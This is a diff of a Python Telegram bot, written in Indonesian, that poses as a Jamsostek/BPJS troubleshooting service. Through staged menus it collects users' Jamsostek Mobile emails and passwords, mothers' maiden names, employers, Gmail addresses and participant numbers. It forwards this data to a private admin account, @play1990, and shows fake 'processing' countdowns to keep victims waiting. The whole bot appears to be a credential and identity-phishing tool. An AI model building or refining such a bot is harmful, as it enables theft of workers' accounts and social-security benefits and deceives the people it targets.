@@ -3,19 +3,22 @@ from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove
 from telegram.ext import Application, CommandHandler, MessageHandler, ConversationHandler, ContextTypes, filters
 import re
 from datetime import datetime
+from config import BOT_TOKEN, ADMIN_ID
 
+# Enable logging
 logging.basicConfig(
     format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
     level=logging.INFO
 )
 logger = logging.getLogger(__name__)
 
+# State constants
 MAIN_MENU, CHOOSE_SERVICE, KODE_040_EMAIL, KODE_040_PASSWORD, KODE_040_TAHUN, SUSPEND_EMAIL, SUSPEND_PASSWORD, UNLOCK_IBU, UNLOCK_PERUSAHAAN, UNLOCK_GMAIL, UNLOCK_NOMOR = range(11)
 
-ADMIN_ID = 1823591491  # GANTI DENGAN ID @play1990
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Start command dan tampilkan menu utama"""
     user = update.effective_user
+    
     welcome_text = f"""
 ╔═══════════════════════════════════════╗
 ║   🤖 BOT JAMSOSTEK TROUBLESHOOTING   ║
@@ -26,6 +29,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 
 Pilih layanan yang Anda butuhkan:
 """
+    
     keyboard = [
         ["🔹 Kode 040"],
         ["🔹 Suspend Nomor KPJ"],
@@ -33,154 +37,446 @@ Pilih layanan yang Anda butuhkan:
         ["ℹ️ Bantuan"]
     ]
     reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
+    
     await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode='HTML')
     return CHOOSE_SERVICE
 
 async def choose_service(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Handle service selection"""
     text = update.message.text.strip()
     
     if "Kode 040" in text:
         context.user_data['service'] = 'Kode 040'
-        await update.message.reply_text("✅ Langkah 1: Masukkan EMAIL Jamsostek Mobile:", reply_markup=ReplyKeyboardRemove())
+        response_text = """
+╔═══════════════════════════════════════╗
+║      📱 KODE 040 - CLAIM PROCESS      ║
+╚═══════════════════════════════════════╝
+
+Proses klaim JMO dengan Kode 040
+
+✅ Langkah 1: Login Akun Jamsostek Mobile
+
+Silakan masukkan EMAIL Jamsostek Mobile Anda:
+"""
+        await update.message.reply_text(response_text, reply_markup=ReplyKeyboardRemove(), parse_mode='HTML')
         return KODE_040_EMAIL
+    
     elif "Suspend Nomor KPJ" in text:
         context.user_data['service'] = 'Suspend Nomor KPJ'
-        await update.message.reply_text("✅ Langkah 1: Masukkan EMAIL Jamsostek Mobile:", reply_markup=ReplyKeyboardRemove())
+        response_text = """
+╔═══════════════════════════════════════╗
+║    🔐 SUSPEND NOMOR KPJ - PROCESS     ║
+╚═══════════════════════════════════════╝
+
+Proses melepas suspend pada nomor KPJ
+
+✅ Langkah 1: Login Akun Jamsostek Mobile
+
+Silakan masukkan EMAIL Jamsostek Mobile Anda:
+"""
+        await update.message.reply_text(response_text, reply_markup=ReplyKeyboardRemove(), parse_mode='HTML')
         return SUSPEND_EMAIL
+    
     elif "Unlock Biometrik" in text:
         context.user_data['service'] = 'Unlock Biometrik'
-        await update.message.reply_text("✅ Langkah 1: Masukkan NAMA IBU KANDUNG:", reply_markup=ReplyKeyboardRemove())
+        response_text = """
+╔═══════════════════════════════════════╗
+║    🔓 UNLOCK BIOMETRIK - PROCESS      ║
+╚═══════════════════════════════════════╝
+
+Proses unlock biometrik Jamsostek
+
+✅ Langkah 1: Identitas Diri
+
+Silakan masukkan NAMA IBU KANDUNG Anda:
+"""
+        await update.message.reply_text(response_text, reply_markup=ReplyKeyboardRemove(), parse_mode='HTML')
         return UNLOCK_IBU
+    
     elif "Bantuan" in text:
         await show_help(update, context)
         return CHOOSE_SERVICE
-    return CHOOSE_SERVICE
+    
+    else:
+        await update.message.reply_text("❌ Pilihan tidak valid. Silakan pilih dari menu di bawah.")
+        return CHOOSE_SERVICE
+
+# ==================== KODE 040 HANDLERS ====================
 
 async def kode_040_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Handle Kode 040 - Email input"""
     email = update.message.text.strip()
-    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
-        await update.message.reply_text("❌ Email tidak valid!")
+    
+    if not is_valid_email(email):
+        await update.message.reply_text("❌ Format email tidak valid. Silakan masukkan email yang benar (contoh: user@gmail.com):")
         return KODE_040_EMAIL
+    
     context.user_data['email'] = email
-    await update.message.reply_text("✅ Langkah 2: Masukkan PASSWORD:")
+    
+    response_text = """
+✅ Langkah 2: Masukkan Password
+
+Silakan masukkan PASSWORD Jamsostek Mobile Anda:
+"""
+    await update.message.reply_text(response_text)
     return KODE_040_PASSWORD
 
 async def kode_040_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    context.user_data['password'] = update.message.text
-    await update.message.reply_text("✅ Langkah 3: Masukkan TAHUN KPJ (contoh: 2023):")
+    """Handle Kode 040 - Password input"""
+    password = update.message.text
+    context.user_data['password'] = password
+    
+    response_text = """
+✅ Langkah 3: Klaim Langsung
+
+Silakan masukkan TAHUN KPJ yang akan diklaim:
+(Contoh: 2023, 2024)
+"""
+    await update.message.reply_text(response_text)
     return KODE_040_TAHUN
 
 async def kode_040_tahun(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Handle Kode 040 - Tahun KPJ input"""
     tahun = update.message.text.strip()
+    
     if not tahun.isdigit() or len(tahun) != 4:
-        await update.message.reply_text("❌ Tahun harus 4 digit!")
+        await update.message.reply_text("❌ Format tahun tidak valid. Silakan masukkan tahun dengan 4 digit (Contoh: 2023):")
         return KODE_040_TAHUN
     
     context.user_data['tahun'] = tahun
-    await update.message.reply_text(f"⏳ Proses sedang berlangsung...\n⌛ Estimasi: 60 menit\n🕐 Dimulai: {datetime.now().strftime('%H:%M:%S')}")
+    
+    # Show processing message
+    processing_text = """
+⏳ <b>PROSES SEDANG BERLANGSUNG</b> ⏳
+
+⌛ Estimasi waktu: <b>60 menit</b>
+
+🔄 Sistem sedang memproses permintaan Anda...
+📊 Status: Pending Processing
+🕐 Waktu dimulai: {waktu}
+
+⚠️ Mohon Menunggu...
+Jangan menutup aplikasi ini
+
+✨ Anda akan menerima notifikasi ketika proses selesai.
+""".format(waktu=datetime.now().strftime("%H:%M:%S"))
+    
+    await update.message.reply_text(processing_text, parse_mode='HTML')
+    
+    # Prepare summary
+    summary = await prepare_summary(context.user_data)
+    await update.message.reply_text(summary, parse_mode='HTML')
+    
+    # Send to admin
     await send_to_admin(update, context)
-    await update.message.reply_text("✅ DATA BERHASIL DIKIRIM!\n\n🎯 Admin akan menghubungi Anda.\n\nTekan /start untuk menu utama")
+    
     return ConversationHandler.END
 
+# ==================== SUSPEND KPJ HANDLERS ====================
+
 async def suspend_email(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Handle Suspend KPJ - Email input"""
     email = update.message.text.strip()
-    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
-        await update.message.reply_text("❌ Email tidak valid!")
+    
+    if not is_valid_email(email):
+        await update.message.reply_text("❌ Format email tidak valid. Silakan masukkan email yang benar:")
         return SUSPEND_EMAIL
+    
     context.user_data['email'] = email
-    await update.message.reply_text("✅ Langkah 2: Masukkan PASSWORD:")
+    
+    response_text = """
+✅ Langkah 2: Masukkan Password
+
+Silakan masukkan PASSWORD Jamsostek Mobile Anda:
+"""
+    await update.message.reply_text(response_text)
     return SUSPEND_PASSWORD
 
 async def suspend_password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    context.user_data['password'] = update.message.text
-    await update.message.reply_text(f"⏳ Proses sedang berlangsung...\n⌛ Estimasi: 45 menit\n🕐 Dimulai: {datetime.now().strftime('%H:%M:%S')}")
+    """Handle Suspend KPJ - Password input"""
+    password = update.message.text
+    context.user_data['password'] = password
+    
+    # Show processing message
+    processing_text = """
+⏳ <b>PROSES LEPAS SUSPEND BERLANGSUNG</b> ⏳
+
+⌛ Estimasi waktu: <b>45 menit</b>
+
+🔄 Sistem sedang memproses permintaan Anda...
+📊 Status: Pending Processing
+🕐 Waktu dimulai: {waktu}
+
+⚠️ Mohon Menunggu...
+Jangan menutup aplikasi ini
+
+✨ Anda akan menerima notifikasi ketika proses selesai.
+""".format(waktu=datetime.now().strftime("%H:%M:%S"))
+    
+    await update.message.reply_text(processing_text, parse_mode='HTML')
+    
+    # Prepare summary
+    summary = await prepare_summary(context.user_data)
+    await update.message.reply_text(summary, parse_mode='HTML')
+    
+    # Send to admin
     await send_to_admin(update, context)
-    await update.message.reply_text("✅ DATA BERHASIL DIKIRIM!\n\n🎯 Admin akan menghubungi Anda.\n\nTekan /start untuk menu utama")
+    
     return ConversationHandler.END
 
+# ==================== UNLOCK BIOMETRIK HANDLERS ====================
+
 async def unlock_ibu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    nama = update.message.text.strip()
-    if len(nama) < 3:
-        await update.message.reply_text("❌ Nama terlalu pendek!")
+    """Handle Unlock Biometrik - Nama Ibu"""
+    nama_ibu = update.message.text.strip()
+    
+    if len(nama_ibu) < 3:
+        await update.message.reply_text("❌ Nama terlalu pendek. Silakan masukkan nama lengkap ibu kandung:")
         return UNLOCK_IBU
-    context.user_data['nama_ibu'] = nama
-    await update.message.reply_text("✅ Langkah 2: Masukkan NAMA PERUSAHAAN:")
+    
+    context.user_data['nama_ibu'] = nama_ibu
+    
+    response_text = """
+✅ Langkah 2: Nama Perusahaan
+
+Silakan masukkan NAMA PERUSAHAAN Anda:
+"""
+    await update.message.reply_text(response_text)
     return UNLOCK_PERUSAHAAN
 
 async def unlock_perusahaan(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    nama = update.message.text.strip()
-    if len(nama) < 3:
-        await update.message.reply_text("❌ Nama terlalu pendek!")
+    """Handle Unlock Biometrik - Nama Perusahaan"""
+    nama_perusahaan = update.message.text.strip()
+    
+    if len(nama_perusahaan) < 3:
+        await update.message.reply_text("❌ Nama perusahaan terlalu pendek. Silakan coba lagi:")
         return UNLOCK_PERUSAHAAN
-    context.user_data['nama_perusahaan'] = nama
-    await update.message.reply_text("✅ Langkah 3: Masukkan GMAIL AKTIF:")
+    
+    context.user_data['nama_perusahaan'] = nama_perusahaan
+    
+    response_text = """
+✅ Langkah 3: Alamat Email
+
+Silakan masukkan GMAIL AKTIF Anda:
+"""
+    await update.message.reply_text(response_text)
     return UNLOCK_GMAIL
 
 async def unlock_gmail(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    email = update.message.text.strip()
-    if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
-        await update.message.reply_text("❌ Email tidak valid!")
+    """Handle Unlock Biometrik - Gmail"""
+    gmail = update.message.text.strip()
+    
+    if not is_valid_email(gmail):
+        await update.message.reply_text("❌ Format email tidak valid. Silakan gunakan format Gmail (contoh: nama@gmail.com):")
         return UNLOCK_GMAIL
-    context.user_data['email'] = email
-    await update.message.reply_text("✅ Langkah 4: Masukkan NOMOR PESERTA (13 digit):")
+    
+    context.user_data['email'] = gmail
+    
+    response_text = """
+✅ Langkah 4: Nomor Peserta
+
+Silakan masukkan NOMOR PESERTA Jamsostek Anda:
+(13 digit, contoh: 1234567890123)
+"""
+    await update.message.reply_text(response_text)
     return UNLOCK_NOMOR
 
 async def unlock_nomor(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Handle Unlock Biometrik - Nomor Peserta"""
     nomor = update.message.text.strip()
+    
     if not nomor.isdigit() or len(nomor) != 13:
-        await update.message.reply_text("❌ Nomor harus 13 digit!")
+        await update.message.reply_text("❌ Nomor peserta harus 13 digit. Silakan masukkan ulang:")
         return UNLOCK_NOMOR
+    
     context.user_data['nomor_peserta'] = nomor
+    
+    # Prepare summary
+    summary = await prepare_summary(context.user_data)
+    await update.message.reply_text(summary, parse_mode='HTML')
+    
+    # Send to admin
     await send_to_admin(update, context)
-    await update.message.reply_text("✅ DATA BERHASIL DIKIRIM!\n\n🎯 Admin akan menghubungi Anda.\n\nTekan /start untuk menu utama")
+    
     return ConversationHandler.END
 
+# ==================== UTILITY FUNCTIONS ====================
+
+def is_valid_email(email):
+    """Validate email format"""
+    pattern = r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$'
+    return re.match(pattern, email) is not None
+
+async def prepare_summary(user_data):
+    """Prepare data summary"""
+    service = user_data.get('service', 'N/A')
+    
+    summary = """
+╔═══════════════════════════════════════╗
+║    ✅ DATA BERHASIL DIKIRIM KE ADMIN  ║
+╚═══════════════════════════════════════╝
+
+📋 <b>RINGKASAN DATA ANDA:</b>
+"""
+    
+    if service == 'Kode 040':
+        summary += f"""
+• Service: {service}
+• Email: {user_data.get('email', 'N/A')}
+• Tahun KPJ: {user_data.get('tahun', 'N/A')}
+• Status: ⏳ Proses (60 menit)
+• Waktu Dikirim: {datetime.now().strftime("%d-%m-%Y %H:%M:%S")}
+"""
+    
+    elif service == 'Suspend Nomor KPJ':
+        summary += f"""
+• Service: {service}
+• Email: {user_data.get('email', 'N/A')}
+• Status: ⏳ Proses (45 menit)
+• Waktu Dikirim: {datetime.now().strftime("%d-%m-%Y %H:%M:%S")}
+"""
+    
+    elif service == 'Unlock Biometrik':
+        summary += f"""
+• Service: {service}
+• Nama Ibu Kandung: {user_data.get('nama_ibu', 'N/A')}
+• Nama Perusahaan: {user_data.get('nama_perusahaan', 'N/A')}
+• Gmail: {user_data.get('email', 'N/A')}
+• Nomor Peserta: {user_data.get('nomor_peserta', 'N/A')}
+• Waktu Dikirim: {datetime.now().strftime("%d-%m-%Y %H:%M:%S")}
+"""
+    
+    summary += """
+🎯 <b>Admin akan menghubungi Anda segera</b>
+
+💡 Tekan /start untuk kembali ke menu utama
+"""
+    
+    return summary
+
+async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Send collected data to admin"""
+    user = update.effective_user
+    user_data = context.user_data
+    service = user_data.get('service', 'N/A')
+    
+    admin_message = f"""
+╔═══════════════════════════════════════╗
+║      📨 DATA BARU DARI USER           ║
+╚═══════════════════════════════════════╝
+
+👤 <b>INFO PENGGUNA:</b>
+• Nama: {user.first_name} {user.last_name or ''}
+• Username: @{user.username or 'N/A'}
+• User ID: {user.id}
+• Waktu: {datetime.now().strftime("%d-%m-%Y %H:%M:%S")}
+
+📋 <b>LAYANAN:</b> {service}
+
+"""
+    
+    if service == 'Kode 040':
+        admin_message += f"""📝 <b>DATA KODE 040:</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+• Email: {user_data.get('email', 'N/A')}
+• Password: {'*' * max(1, len(str(user_data.get('password', ''))))}
+• Tahun KPJ: {user_data.get('tahun', 'N/A')}
+• Status Proses: ⏳ 60 menit
+"""
+    
+    elif service == 'Suspend Nomor KPJ':
+        admin_message += f"""📝 <b>DATA SUSPEND KPJ:</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+• Email: {user_data.get('email', 'N/A')}
+• Password: {'*' * max(1, len(str(user_data.get('password', ''))))}
+• Status Proses: ⏳ 45 menit
+"""
+    
+    elif service == 'Unlock Biometrik':
+        admin_message += f"""📝 <b>DATA UNLOCK BIOMETRIK:</b>
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+• Nama Ibu Kandung: {user_data.get('nama_ibu', 'N/A')}
+• Nama Perusahaan: {user_data.get('nama_perusahaan', 'N/A')}
+• Gmail Aktif: {user_data.get('email', 'N/A')}
+• Nomor Peserta: {user_data.get('nomor_peserta', 'N/A')}
+"""
+    
+    admin_message += """
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ Silakan segera hubungi user ini!
+"""
+    
+    try:
+        await context.bot.send_message(
+            chat_id=ADMIN_ID,
+            text=admin_message,
+            parse_mode='HTML'
+        )
+        logger.info(f"Data sent to admin for user {user.id}")
+    except Exception as e:
+        logger.error(f"Error sending message to admin: {e}")
+
 async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Show help information"""
     help_text = """
 ╔═══════════════════════════════════════╗
 ║        🆘 BANTUAN & INFORMASI        ║
 ╚═══════════════════════════════════════╝
 
-<b>1️⃣ KODE 040</b> - Klaim benefit (60 menit)
-<b>2️⃣ SUSPEND KPJ</b> - Lepas suspend (45 menit)
-<b>3️⃣ UNLOCK BIOMETRIK</b> - Unlock biometrik
+<b>📌 LAYANAN YANG TERSEDIA:</b>
 
-📞 Admin: @play1990
+<b>1️⃣ KODE 040</b>
+   ├─ Untuk klaim benefit dengan Kode 040
+   ├─ Waktu proses: 60 menit
+   └─ Persyaratan: Email & Password Jamsostek Mobile
+
+<b>2️⃣ SUSPEND NOMOR KPJ</b>
+   ├─ Untuk melepas suspend pada nomor KPJ
+   ├─ Waktu proses: 45 menit
+   └─ Persyaratan: Email & Password Jamsostek Mobile
+
+<b>3️⃣ UNLOCK BIOMETRIK</b>
+   ├─ Untuk membuka kunci biometrik
+   ├─ Waktu proses: Segera
+   └─ Persyaratan: Nama Ibu, Perusahaan, Gmail, No. Peserta
+
+<b>📱 PERINTAH YANG TERSEDIA:</b>
+/start - Kembali ke menu utama
+/help - Tampilkan bantuan ini
+/cancel - Batalkan proses
+
+<b>📞 HUBUNGI ADMIN:</b>
+@play1990
+
+<b>⚠️ CATATAN PENTING:</b>
+• Pastikan data yang Anda masukkan sudah benar
+• Jangan membagikan password kepada siapapun
+• Proses membutuhkan waktu sesuai estimasi
+• Anda akan dihubungi admin segera setelah data diterima
 """
     await update.message.reply_text(help_text, parse_mode='HTML')
 
-async def send_to_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user = update.effective_user
-    data = context.user_data
-    service = data.get('service', 'N/A')
-    
-    msg = f"📨 DATA BARU\n👤 {user.first_name} (@{user.username})\n📋 Service: {service}\n"
-    
-    if service == 'Kode 040':
-        msg += f"📧 Email: {data.get('email')}\n📅 Tahun: {data.get('tahun')}\n⏳ 60 menit"
-    elif service == 'Suspend Nomor KPJ':
-        msg += f"📧 Email: {data.get('email')}\n⏳ 45 menit"
-    elif service == 'Unlock Biometrik':
-        msg += f"👨‍👩‍👧 Ibu: {data.get('nama_ibu')}\n🏢 Perusahaan: {data.get('nama_perusahaan')}\n📧 Gmail: {data.get('email')}\n🆔 No: {data.get('nomor_peserta')}"
-    
-    try:
-        await context.bot.send_message(chat_id=ADMIN_ID, text=msg)
-    except Exception as e:
-        logger.error(f"Error: {e}")
-
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    await update.message.reply_text("❌ Dibatalkan.\n\nTekan /start untuk menu utama", reply_markup=ReplyKeyboardRemove())
+    """Cancel and return to main menu"""
+    await update.message.reply_text(
+        "❌ Proses dibatalkan.\n\nTekan /start untuk kembali ke menu utama.",
+        reply_markup=ReplyKeyboardRemove()
+    )
     return ConversationHandler.END
 
 def main() -> None:
-    application = Application.builder().token("YOUR_BOT_TOKEN_HERE").build()
+    """Start the bot"""
+    application = Application.builder().token(BOT_TOKEN).build()
 
+    # Main conversation handler
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler('start', start)],
         states={
             CHOOSE_SERVICE: [
-                MessageHandler(filters.Regex('^🔹'), choose_service),
-                MessageHandler(filters.Regex('^ℹ️'), choose_service),
+                MessageHandler(filters.Regex('^🔹 Kode 040$'), choose_service),
+                MessageHandler(filters.Regex('^🔹 Suspend Nomor KPJ$'), choose_service),
+                MessageHandler(filters.Regex('^🔹 Unlock Biometrik$'), choose_service),
+                MessageHandler(filters.Regex('^ℹ️ Bantuan$'), choose_service),
             ],
             KODE_040_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, kode_040_email)],
             KODE_040_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, kode_040_password)],
@@ -197,8 +493,11 @@ def main() -> None:
 
     application.add_handler(conv_handler)
     application.add_handler(CommandHandler('help', show_help))
+    
+    # Run the bot
     print("🤖 Bot is running... Press Ctrl+C to stop")
     application.run_polling()
 
 if __name__ == '__main__':
     main()
+    
